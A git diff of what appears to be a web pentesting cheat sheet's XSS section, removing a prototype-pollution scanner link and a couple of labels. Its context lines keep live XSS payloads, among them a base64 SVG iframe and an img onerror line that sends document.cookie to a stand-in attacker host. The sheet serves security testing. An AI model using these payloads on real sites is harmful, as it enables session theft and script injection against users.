@@ -1001,7 +1001,6 @@ Manually testing for XXE vulnerabilities generally involves
 - For blind XSS
   - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
   - [XSS Hunter](https://xsshunter.com/)
-- [ppfuzz](https://github.com/dwisiswant0/ppfuzz) a fast tool to scan client-side prototype pollution vulnerability
 - [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
 - [Weaponised XSS payloads](https://github.com/hakluke/weaponised-XSS-payloads)
 - [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
@@ -1050,7 +1049,6 @@ Manually testing for XXE vulnerabilities generally involves
   ```
 - [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
 - For **mobile applications**: try to use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
-- For **desktop applications**: 
 - iframe + base64 encoded SVG 
   ```HTML
   <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>
@@ -1065,8 +1063,7 @@ Manually testing for XXE vulnerabilities generally involves
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?x='+document.cookie;>
     ```
-- onbeforeinput + contenteditable
-  ```JavaScript
+- ```JavaScript
   %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
   ```
 - ```JavaScript
